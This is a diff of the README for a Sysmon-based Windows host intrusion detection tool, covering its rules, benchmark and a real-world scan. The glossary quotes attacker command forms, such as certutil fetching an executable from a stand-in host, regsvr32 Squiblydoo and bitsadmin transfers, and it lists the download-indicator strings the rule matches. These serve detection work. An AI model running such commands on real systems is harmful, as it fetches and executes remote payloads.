@@ -1,56 +1,47 @@
 # Host Intrusion Detector
 
-A lightweight host intrusion detection tool that reads Sysmon-instrumented
-Windows Event Log data and flags suspicious behavior: encoded/obfuscated
-PowerShell, Office/browser processes spawning shells (the classic
-macro-dropper and drive-by-download chains), living-off-the-land binaries
-(certutil, mshta, rundll32, ...) used to fetch remote payloads, new
-scheduled tasks (a common persistence mechanism), and processes executing
-from temp/download paths. New to these terms? See the [Glossary](#glossary).
+A small host intrusion detection tool for Windows. It reads Sysmon event
+logs and flags suspicious behavior: encoded PowerShell, Office or a browser
+launching a shell (macro-dropper and drive-by-download chains), built-in
+binaries like certutil, mshta and rundll32 downloading remote payloads, new
+scheduled tasks (a common persistence method), and programs running from
+temp or download folders. New to these terms? See the [Glossary](#glossary).
 
-Like the companion [LLM_Vulnerability_Scanner](../LLM_Vulnerability_Scanner)
-project, this isn't just a detector - it's a detector plus proof that the
-detector works: a hand-labeled corpus of malicious and deliberately
-similar-looking benign event pairs, graded with precision/recall/F1, so
-"it catches bad stuff" is a checked claim, not an assertion.
+As with my [LLM_Vulnerability_Scanner](../LLM_Vulnerability_Scanner)
+project, I scored the detector against a hand-labeled set of malicious
+events, each paired with a benign event that looks similar, using
+precision, recall and F1.
 
 ## Status
 
-Rule engine, scorer, and labeled benchmark corpus are done and passing - run
-`python -m pytest -q` and `hids benchmark` for the current numbers (see
-[Current results](#current-results) for a recent run). Sysmon is installed
-on my dev workstation, and `hids scan` has been run against five days of
-its real log (see [Real-world scan](#real-world-scan-november-2026)). That
-run found no attacks, two allowlist gaps (now fixed), and two known kinds
-of false positive from `EXEC_FROM_TEMP`. Installing Sysmon stays a manual,
-elevated step, as does exporting its log (see
-[Installing Sysmon](#installing-sysmon)).
+The rule engine, scorer and benchmark corpus are done and passing. Run
+`python -m pytest -q` and `hids benchmark` for the current numbers
+([Current results](#current-results) has a recent run). I installed Sysmon
+on my dev workstation and ran `hids scan` on five days of its log (see
+[Real-world scan](#real-world-scan-november-2026)). It found no attacks,
+two allowlist gaps (now fixed), and two kinds of expected false positive
+from `EXEC_FROM_TEMP`. Installing Sysmon and exporting its log are still
+manual steps that need admin rights (see [Installing Sysmon](#installing-sysmon)).
 
-## Why this project exists
+## Why I built it
 
-"AI/rules-based detection" claims in security tooling are almost always
-unverifiable - a tool that flags something and a person nodding along.
-The differentiator here is the same one as the vuln-scanner project: don't
-just write detection logic, write the answer key first (a labeled set of
-malicious-vs-benign-but-similar event pairs - e.g. `certutil -urlcache`
-downloading a payload vs. `certutil -verify` checking a certificate, both
-using the same binary), then grade the detector against it honestly. That
-turns "I built an IDS" into "I built an IDS, and here's the precision/recall
-on cases specifically chosen to be hard for it."
+Most detection tools ask you to trust that their rules work. I wanted to
+check mine, so I wrote the answer key first: pairs of malicious and benign
+events that use the same program, like `certutil -urlcache` downloading a
+payload vs. `certutil -verify` checking a certificate. Then I scored the
+detector against it. That way I can say what the precision and recall are
+on cases picked to be hard for it, not just that it works.
 
-### Why endpoint telemetry, specifically
+### Why endpoint logs
 
-Network-layer security tooling (packet capture, firewall rules) is the
-common freshman security project. Endpoint telemetry - what Sysmon actually
-sees on a single host: full command lines, parent/child process trees,
-image hashes - is what SOC/blue-team analysts spend most of their day
-reading, and it's a different skill: understanding *normal* Windows process
-behavior well enough to write a rule that doesn't false-positive on it. The
-benchmark corpus below is built specifically around that - each malicious
-case is paired with a benign case that shares the same binary or parent
-process, so a rule that just pattern-matches "certutil.exe" or
-"WINWORD.EXE spawned something" without checking the specific behavior
-would fail the benchmark, not just look naively accurate.
+Network tools (packet capture, firewall rules) are the usual student
+security project. I went with endpoint logs instead: what Sysmon records on
+one machine, such as full command lines, parent/child process trees and
+file hashes. This is what SOC analysts read most of the day, and the hard
+part is knowing normal Windows behavior well enough that a rule doesn't fire
+on it. Every malicious case in the benchmark has a benign twin with the same
+binary or parent process, so a rule that only matches "certutil.exe" or
+"WINWORD.EXE started something" fails.
 
 ## Glossary
 
@@ -62,10 +53,16 @@ would fail the benchmark, not just look naively accurate.
   - `certutil.exe`: a certificate-management utility. `certutil -urlcache -split -f <url>` downloads arbitrary files.
   - `mshta.exe`: runs HTML Application (`.hta`) files, including ones fetched straight from a URL, which means it can execute remote script.
   - `rundll32.exe`: calls an exported function in a DLL. It can be abused to run attacker DLLs or inline script.
-  - `regsvr32.exe`: registers COM DLLs. `regsvr32 /i:<url> scrobj.dll` fetches and runs a remote script (the "Squiblydoo" technique).
-  - `bitsadmin.exe`: controls the Background Intelligent Transfer Service. `bitsadmin /transfer` downloads files in the background.
+  - `regsvr32.exe`: registers COM DLLs, the shared components Windows programs use; installers normally run it to tell Windows a component exists. `regsvr32 /i:<url> scrobj.dll` instead makes it download a small script file (`.sct`) from a website and run it. This is the "Squiblydoo" technique, named after the two pieces it uses (`scrobj.dll` and `.sct` files). Attackers like it because it runs their code through a trusted Microsoft program and leaves almost nothing on disk. ATT&CK: [T1218.010](https://attack.mitre.org/techniques/T1218/010/) (System Binary Proxy Execution: Regsvr32).
+  - `bitsadmin.exe`: controls BITS (Background Intelligent Transfer Service), the Windows service that downloads Windows Updates quietly in the background and keeps going after a reboot. `bitsadmin /transfer <url>` uses it to download any file. Attackers like it because the download looks like normal Windows Update traffic and keeps retrying until it finishes. ATT&CK: [T1197](https://attack.mitre.org/techniques/T1197/) (BITS Jobs).
 - **Payload**: The malicious code an attack ultimately delivers and runs (ransomware, a remote-access trojan, a credential stealer). Droppers and LOLBins are usually just the delivery mechanism.
-- **Download indicator**: A command-line feature showing that a process is fetching remote content, such as a URL (`http://`, `https://`), `-urlcache`, or PowerShell's `DownloadString` / `DownloadFile` (from `System.Net.WebClient`). `LOLBIN_DOWNLOAD` requires one of these, so benign uses like `certutil -verify` don't fire.
+- **Download indicator**: Text in a command line that shows the program is downloading something from the internet. The LOLBins above run all the time for normal reasons, so `LOLBIN_DOWNLOAD` only fires when one of them also has a download indicator in its command line. For example, `certutil -verify cert.cer` (checking a certificate) is left alone, but `certutil -urlcache -f http://evil.example/a.exe` is flagged. The rule looks for:
+  - `http://` or `https://`: a web address.
+  - `-urlcache`: certutil's download option.
+  - `DownloadString` / `DownloadFile`: the usual PowerShell way to download, sometimes hidden inside an `mshta` or `rundll32` command.
+  - `BitsTransfer`: PowerShell's commands for BITS downloads (`Start-BitsTransfer`).
+
+  It's a plain text match, so a file copied from a network share (`\\server\share\file.exe`) has no indicator and isn't caught.
 - **Encoded / obfuscated PowerShell**: PowerShell accepts `-EncodedCommand` (or abbreviations like `-enc`, `-e`) followed by a Base64 string of the script, so the real command never appears in plain text in logs or to a casual reader. Legitimate software rarely needs this. Malware uses it constantly, often alongside `-NoProfile`, `-WindowStyle Hidden`, or `-ExecutionPolicy Bypass`. This is what `ENCODED_POWERSHELL` detects.
 - **Persistence**: Any mechanism that lets malware survive a reboot or logoff and keep running, such as scheduled tasks, Run registry keys, services, or startup folders.
 - **Scheduled task**: A Windows Task Scheduler job that runs a program on a trigger (at logon, every N minutes, at boot). It is created with `schtasks /create` or the Task Scheduler API, and it is one of the most common persistence methods. This is what `SCHEDULED_TASK_CREATED` detects.
@@ -87,13 +84,25 @@ would fail the benchmark, not just look naively accurate.
 
 - **HIDS (Host-based Intrusion Detection System)**: A system that watches activity on a single machine for signs of compromise. It complements a network IDS, which watches traffic.
 - **SOC / blue team**: The Security Operations Center, the defenders who triage alerts and investigate incidents. Most of their day is spent reading endpoint telemetry like this.
-- **MITRE ATT&CK**: A public knowledge base of real-world attacker techniques, each with an ID. The IDs used here:
-  - `T1059.001`: Command and Scripting Interpreter: PowerShell
-  - `T1566.001`: Phishing: Spearphishing Attachment (the macro-dropper entry point)
-  - `T1189`: Drive-by Compromise
-  - `T1053.005`: Scheduled Task/Job: Scheduled Task
-  - `T1105`: Ingress Tool Transfer (pulling tools or payloads onto the host)
-  - `T1204`: User Execution (the user is tricked into running something)
+- **MITRE ATT&CK**: A free, public catalog of how real attackers operate, kept by MITRE (a US non-profit research organization) and built from published incident reports. It's at [attack.mitre.org](https://attack.mitre.org/). Security teams use it as a shared vocabulary: instead of "the PowerShell thing", a finding can say `T1059.001`, and anyone can look up exactly what that means. It's also used to check coverage, i.e. which attacker techniques a team's detections can and can't see.
+
+  It's organized in three levels:
+  - **Tactic**: the attacker's *goal* at that stage, such as Initial Access (getting in), Execution (running code), Persistence (staying in after a reboot) or Defense Evasion (avoiding detection).
+  - **Technique**: *how* they reach that goal, with an ID like `T1053` (Scheduled Task/Job).
+  - **Sub-technique**: a more specific version, shown after a dot, like `T1053.005` (Scheduled Task, as opposed to `.003` Cron on Linux).
+
+  Every rule in this tool tags its findings with one technique ID:
+
+  | ID | Name | Tactic | What it means | Rule |
+  |---|---|---|---|---|
+  | [`T1059.001`](https://attack.mitre.org/techniques/T1059/001/) | Command and Scripting Interpreter: PowerShell | Execution | Using PowerShell to run attacker commands | `ENCODED_POWERSHELL` |
+  | [`T1566.001`](https://attack.mitre.org/techniques/T1566/001/) | Phishing: Spearphishing Attachment | Initial Access | A malicious email attachment, the start of the macro-dropper chain | `OFFICE_SPAWNED_SHELL` |
+  | [`T1189`](https://attack.mitre.org/techniques/T1189/) | Drive-by Compromise | Initial Access | Getting in through a malicious or hacked website | `BROWSER_SPAWNED_SHELL` |
+  | [`T1053.005`](https://attack.mitre.org/techniques/T1053/005/) | Scheduled Task/Job: Scheduled Task | Execution, Persistence | Using Task Scheduler to run code later or at every logon | `SCHEDULED_TASK_CREATED` |
+  | [`T1105`](https://attack.mitre.org/techniques/T1105/) | Ingress Tool Transfer | Command and Control | Downloading tools or payloads onto the machine | `LOLBIN_DOWNLOAD` |
+  | [`T1204`](https://attack.mitre.org/techniques/T1204/) | User Execution | Execution | Tricking the user into running something themselves | `EXEC_FROM_TEMP` |
+
+  The LOLBin entries above also mention `T1218.010` and `T1197`. Those describe the specific regsvr32 and BITS tricks, but `LOLBIN_DOWNLOAD` reports `T1105` because what it detects is the download itself.
 - **Rule / Finding**: A rule is one detection check applied to an event. A finding is what a rule emits when it fires: the rule ID, severity, ATT&CK technique, and the event that triggered it.
 - **Severity**: How urgent a finding is (Low / Medium / High / Critical), based on how strongly the behavior indicates compromise and how rarely it happens legitimately.
 - **Risk score**: The total severity of all findings for one process, so a process that trips several rules ranks above one that trips a single weak rule.
@@ -108,24 +117,35 @@ would fail the benchmark, not just look naively accurate.
 hids/
   events.py              Normalized Event dataclass (Sysmon EventID 1 process-
                          create fields + a generic "extra" bag for other IDs)
+                         
   collector.py           Reads events from: a live Sysmon channel, an exported
                          .evtx file (both via wevtutil, no extra install), or a
                          JSON fixture (for tests/demos without Sysmon installed)
+
   rules.py               6 detection rules, each event-id-typed, each returning
                          a Finding with a severity and a MITRE ATT&CK technique ID
+
   scorer.py              Groups findings by process into a risk score; grades
                          the rule set against a labeled fixture (precision/recall/F1)
+
   credaudit_bridge.py    Shells out to the companion credential-auditor
                          project's `credaudit --json` and adapts its findings
                          into HIDS's own risk-score format
+
   cli.py                 `hids scan <source>`, `hids benchmark [<fixture>]`,
                          and `hids audit-credentials`
+
 tests/
   test_rules.py                  unit tests, one malicious/benign pair per rule
+
   test_scorer.py                 benchmark-corpus regression test
+
   test_collector.py              XML parsing + wevtutil error handling (sample output)
+
   test_cli.py                    subcommand exit codes and output
+
   test_credaudit_bridge.py       bridge unit tests (subprocess mocked)
+  
   fixtures/labeled_events.json   16 hand-labeled synthetic Sysmon events
                                  (8 malicious/benign pairs; malicious rows
                                  also name the rule expected to fire)
@@ -152,12 +172,11 @@ process-level and credential-hygiene risks. Requires `credaudit` to be installed
 | `LOLBIN_DOWNLOAD` | ID 1 (certutil/mshta/rundll32/regsvr32/bitsadmin) | T1105 | High |
 | `EXEC_FROM_TEMP` | ID 1 | T1204 | Low |
 
-Each rule is intentionally narrow rather than a broad keyword match - e.g.
-`OFFICE_SPAWNED_SHELL` only fires when the *child* is a shell/scripting
-engine, not any child process (Word legitimately spawns `splwow64.exe` for
-printing constantly); `LOLBIN_DOWNLOAD` only fires when the command line
-also contains a download indicator (URL, `-urlcache`, `DownloadString`),
-not on every certutil invocation.
+The rules are narrow on purpose. `OFFICE_SPAWNED_SHELL` only fires when the
+child process is a shell or script engine, since Word starts `splwow64.exe`
+every time you print. `LOLBIN_DOWNLOAD` only fires when the command line
+also has a download indicator (a URL, `-urlcache`, `DownloadString`), not
+on every certutil call.
 
 ## Current results
 
@@ -169,17 +188,14 @@ Cases: 16  TP=8  FP=0  FN=0
 Precision: 1.00  Recall: 1.00  F1: 1.00
 ```
 
-Each malicious row also names the rule it was written to exercise, and the
-benchmark warns if a different rule fired instead - so "a rule fired" and
-"the intended rule fired" are checked separately, not conflated.
+Each malicious case also names the rule it is meant to trigger, and the
+benchmark warns if a different rule fired instead.
 
-This is a small, hand-curated corpus (8 malicious/benign pairs, one per
-rule), not a claim of production-grade coverage - the honest caveat is that
-1.00/1.00 on 16 cases you wrote yourself is a sanity check that the rules
-work as designed, not evidence they'll hold up against real, unseen
-attacker behavior or a large false-positive-prone production environment.
-The real-world scan below is the other half: what fires on ordinary daily
-use, which is where false positives actually get found.
+The corpus is small (8 malicious/benign pairs, one per rule). 1.00/1.00 on
+16 cases I wrote myself shows the rules work as designed. It doesn't show
+they would catch real attackers or stay quiet on a busy production network.
+The real-world scan below covers the other side: what fires during normal
+daily use, which is where false positives turn up.
 
 ## Real-world scan (November 2026)
 
@@ -203,15 +219,14 @@ hids scan "$env:USERPROFILE\sysmon-export.evtx" --allowlist allowlist.example.js
 | Confirmed malicious | 0 |
 
 Normal daily use (coding, Claude Code sessions, a VS Code update, a driver
-install) never triggered the four High/Critical behavior rules. Every hit came
-from the two rules that look at flags and paths, not process ancestry.
+install) never set off the four High/Critical behavior rules. Every hit came
+from the two rules that look at flags and paths rather than parent processes.
 
 ### What fired, and what was done about it
 
 **1. Claude Code's PowerShell 7 calls: 52 `ENCODED_POWERSHELL` hits, allowlist gap (fixed).**
 Claude Code launches PowerShell with `-ExecutionPolicy Bypass` and, for its
-command parser, `-EncodedCommand`. That is exactly the shape the rule is
-built to catch. The allowlist already covered these command lines, but only
+command parser, `-EncodedCommand`, which is what the rule looks for. The allowlist already covered these command lines, but only
 under Windows PowerShell 5.1 (`powershell.exe`). During the scan window
 Claude Code switched to PowerShell 7 (`pwsh.exe`, installed from the
 Microsoft Store under `C:\Program Files\WindowsApps\Microsoft.PowerShell_7.7.0.0_x64__8wekyb3d8bbwe\`),
@@ -244,10 +259,10 @@ grouped findings collapse into one line of output, which is acceptable noise.
 **4. An installer run from Downloads: 1 `EXEC_FROM_TEMP` hit, true positive of the behavior, benign intent (left in).**
 `Downloads\sqliteodbc_w64 (1).exe` (the SQLite ODBC driver, installed for
 another project) was started by `chrome.exe` when I opened it from the
-download bar. This is exactly what the rule is for: a freshly downloaded
-binary running from a user-writable folder. Only the person who ran it can
-tell it's benign. `BROWSER_SPAWNED_SHELL` correctly stayed quiet, because
-the child is an installer, not a shell.
+download bar. This is what the rule is for: a freshly downloaded program
+running from a user-writable folder. I know it's benign because I ran it.
+`BROWSER_SPAWNED_SHELL` stayed quiet, as it should, because the child is an
+installer, not a shell.
 
 After the two allowlist fixes, the same export produces:
 
@@ -269,36 +284,41 @@ Suppressed by allowlist (77 findings):
 
 ### Takeaways
 
-- **Allowlists break when software updates.** Both gaps came from legitimate
-  software changing slightly: a different PowerShell binary, different
-  quoting. An exact-match allowlist fails safe (the finding shows up, nothing
-  is silently hidden), but it needs re-checking after updates. The report's
-  per-entry suppression counts make that visible: an entry that suddenly
-  hits 0 times has probably drifted.
-- **The heaviest PowerShell user on this machine is an AI coding agent.**
-  Seventy of the 77 suppressed findings are Claude Code's own shell calls. On
-  developer machines, agent tooling is now a major source of detection noise,
-  and it looks a lot like what the rules are hunting: hidden windows,
+- **Allowlists break when software updates.** Each allowlist entry describes
+  one known-good command exactly. When an update changes that command even a
+  little, the entry stops matching. That's what caused both gaps: Claude Code
+  switched from `powershell.exe` to `pwsh.exe`, and the VS Code installer
+  changed how it quotes one of its commands.
+
+  When this happens, the error is on the safe side: the tool shows an alert it
+  should have hidden, rather than hiding something it should have shown. The
+  cost is that the allowlist needs checking after updates. To make that easy,
+  each report lists how many findings every allowlist entry hid. If an entry
+  that normally hides dozens of findings suddenly hides 0, the software it
+  covers has probably changed, and the entry needs updating.
+- **The heaviest PowerShell user on my machine is an AI coding agent.**
+  70 of the 77 suppressed findings are Claude Code's own shell calls. On a
+  developer machine, coding agents now make a lot of detection noise, and it
+  looks a lot like what the rules look for: hidden windows,
   execution-policy bypass, Base64-encoded commands.
 - **`EXEC_FROM_TEMP` is a context signal, not an alert.** Both remaining
   findings are correct about the behavior and benign in intent. That is why
   the rule is rated Low. It is most useful as a score booster when it
-  coincides with another rule on the same process (see Roadmap: stateful
-  correlation).
+  coincides with another rule on the same process (see Roadmap: connect
+  related events).
 - **What this does *not* show:** five quiet days on one machine say nothing
   about recall against real attacks, because none happened. Recall is still
   measured only by the labeled benchmark.
 
 ## Installing Sysmon
 
-Not done by this tool - deliberately kept as a manual, elevated step:
+The tool doesn't install Sysmon for you. It needs admin rights, so I kept it a manual step:
 
 1. Download Sysmon from Microsoft Sysinternals:
    https://learn.microsoft.com/sysinternals/downloads/sysmon
 2. Get a config file. [SwiftOnSecurity's sysmon-config](https://github.com/SwiftOnSecurity/sysmon-config)
-   is the widely-used community default (logs process creation with full
-   command lines, network connections, and more, with sensible noise
-   filtering).
+   is the common community default. It logs process creation with full
+   command lines, network connections and more, and filters out most noise.
 3. From an elevated (Administrator) terminal:
    ```
    sysmon64.exe -accepteula -i sysmonconfig-export.xml
@@ -331,14 +351,27 @@ python -m hids.cli scan path\to\exported.evtx
 
 ## Roadmap
 
-- Stateful correlation across events (e.g. a process that creates a
-  scheduled task *and* was itself spawned from Temp within N seconds -
-  currently each rule only sees one event at a time).
-- Optional: a small local LLM pass (same two-detector-comparison idea as
-  LLM_Vulnerability_Scanner) that reasons over a process's full command
-  line and ancestry chain, compared against the rule engine on the same
-  benchmark methodology.
+- **Connect related events.** Right now each rule looks at one event and
+  forgets it. Some attacks only stand out when you link events together.
+  For example:
+
+  ```
+  10:00:01  invoice.exe starts from Downloads          → EXEC_FROM_TEMP (Low)
+  10:00:03  invoice.exe runs "schtasks /create ..."    → SCHEDULED_TASK_CREATED (Medium)
+  ```
+
+  Each finding is weak on its own: installers run from Downloads, and IT
+  tools create scheduled tasks. Together they show a freshly downloaded
+  program setting itself up to run after every reboot, which should be one
+  High alert. The risk score doesn't catch this today, because the two
+  findings belong to different processes (`invoice.exe` and the
+  `schtasks.exe` it started). Fixing it means remembering recent findings
+  for a short time window and checking whether each new event's parent was
+  just flagged. The benchmark would also need multi-event test cases.
+- Try a small local LLM that reads a process's full command line and parent
+  chain, and score it against the rule engine on the same benchmark, like
+  in LLM_Vulnerability_Scanner.
 
 ## License
 
-MIT - see [LICENSE](LICENSE).
+MIT, see [LICENSE](LICENSE).
